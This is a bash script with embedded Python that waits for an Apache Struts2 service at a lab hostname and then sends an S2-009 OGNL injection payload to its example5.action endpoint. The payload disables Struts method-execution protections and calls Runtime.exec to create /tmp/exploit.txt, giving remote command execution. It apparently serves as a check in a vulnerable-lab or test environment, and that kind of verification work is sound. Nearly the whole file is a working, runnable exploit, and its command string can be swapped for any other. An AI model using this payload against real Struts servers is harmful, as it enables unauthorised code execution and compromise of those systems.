#!/bin/bash
set -e

URL_BASE="http://struts2:8080"

# Wait for service to be ready
wait_for_service() {
    echo "Waiting for Struts2 to be ready..."
    for i in {1..30}; do
        if curl -s -f "$URL_BASE/ajax/example5.action" > /dev/null 2>&1; then
            echo "Service is ready"
            return 0
        fi
        sleep 2
    done
    echo "Service failed to become ready"
    return 1
}

wait_for_service

# Exploit S2-009 OGNL parameter expression evaluation
# Put OGNL expression in a parameter (name), then trigger evaluation with z[(name)('meh')]=true
# This exploits the Expression Evaluation feature where parameters can be evaluated as OGNL

python <<'PYTHON_EOF'
import urllib.parse
import urllib.request
import sys

url = "http://struts2:8080/ajax/example5.action"

# OGNL payload to execute command: touch /tmp/exploit.txt
# The payload structure: (#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('touch /tmp/exploit.txt'))(meh)
payload = "(#context[\"xwork.MethodAccessor.denyMethodExecution\"]= new java.lang.Boolean(false), #_memberAccess[\"allowStaticMethodAccess\"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('touch /tmp/exploit.txt'))(meh)"

# Build URL with parameters
params = {
    'age': '12313',
    'name': payload,
    'z[(name)(\'meh\')]': 'true'
}

query_string = urllib.parse.urlencode(params)
full_url = f"{url}?{query_string}"

try:
    response = urllib.request.urlopen(full_url)
    print("RCE exploit executed successfully", flush=True)
    sys.exit(0)
except Exception as e:
    print(f"Error: {e}", file=sys.stderr, flush=True)
    sys.exit(1)
PYTHON_EOF
